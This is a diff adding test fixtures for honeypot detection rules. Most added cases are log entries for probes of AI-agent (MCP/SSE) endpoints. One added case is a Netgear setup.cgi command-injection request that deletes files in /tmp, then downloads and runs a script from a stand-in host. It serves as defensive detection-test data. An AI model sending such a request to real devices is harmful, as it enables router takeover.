@@ -49,6 +49,28 @@
 #@ expect=100340 not=100348
 {"timestamp": "2026-10-30 09:10:12", "honeypot_event": "http_request", "ip": "203.0.113.69", "method": "GET", "path": "/models"}
 
+# (100349) sondeo de endpoint MCP/agente de IA
+#@ expect=100349
+{"timestamp": "2026-11-20 09:10:13", "honeypot_event": "http_request", "ip": "203.0.113.73", "method": "GET", "path": "/mcp"}
+
+#@ expect=100349
+{"timestamp": "2026-11-20 09:10:14", "honeypot_event": "http_request", "ip": "203.0.113.73", "method": "GET", "path": "/sse"}
+
+#@ expect=100349
+{"timestamp": "2026-11-20 09:10:15", "honeypot_event": "http_request", "ip": "203.0.113.73", "method": "GET", "path": "/api/mcp"}
+
+# Una ruta parecida pero distinta no debe disparar 100349
+#@ expect=100340 not=100349
+{"timestamp": "2026-11-20 09:10:16", "honeypot_event": "http_request", "ip": "203.0.113.74", "method": "GET", "path": "/mcpx"}
+
+# (100380) exploit de router Netgear (inyeccion de comando via syscmd)
+#@ expect=100380
+{"timestamp": "2026-11-20 09:10:17", "honeypot_event": "http_request", "ip": "203.0.113.75", "method": "GET", "path": "/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://203.0.113.9/x;sh+x&curpath=/&currentsetting.htm=1"}
+
+# Una request normal a setup.cgi sin el comando no debe disparar 100380
+#@ expect=100340 not=100380
+{"timestamp": "2026-11-20 09:10:18", "honeypot_event": "http_request", "ip": "203.0.113.76", "method": "GET", "path": "/setup.cgi?todo=login"}
+
 # (100346) rafaga: muchos requests de la misma IP en poco tiempo. Umbral 10 en 120 s; se manda 12 veces.
 #@ session=rafaga repeat=12 expect=100346
 {"timestamp": "2026-10-30 09:10:13", "honeypot_event": "http_request", "ip": "203.0.113.70", "method": "GET", "path": "/"}
